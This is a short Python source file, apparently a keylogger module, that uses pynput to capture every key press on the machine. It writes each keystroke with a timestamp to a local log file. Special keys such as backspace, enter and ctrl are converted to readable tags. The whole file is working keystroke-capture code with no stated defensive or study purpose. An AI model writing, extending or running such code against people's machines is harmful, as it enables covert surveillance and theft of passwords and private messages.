from pynput import keyboard
from datetime import datetime

# Define the path to the log file where keystrokes will be recorded
LOG_FILE = "logs/keylog.txt"

def write_to_file(key):
    # Processes the key event and appends the key with a timestamp to the log file.
    try:
        with open(LOG_FILE, "a") as f:
            k = str(key).replace("'", "")
             # Handle special keys with readable names
            if key == keyboard.Key.space:
                k = " "
            elif key == keyboard.Key.enter:
                k = "\n"
            elif key == keyboard.Key.tab:
                k = "\t"
            elif key == keyboard.Key.backspace:
                k = "[BACKSPACE]"
            elif key == keyboard.Key.esc:
                k = "[ESCAPE]"
            elif "Key." in k:
                # Convert other special keys like Key.ctrl_l to [CTRL_L]
                k = f"[{k.split('.')[1].upper()}]"
              # Get the current timestamp for the keystroke an write to file
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp}: {k}\n")
    except Exception as e:
        print(f" [ERROR] Logging failed: {e}")
def start():
    with keyboard.Listener(on_press=write_to_file) as listener:
        listener.join()
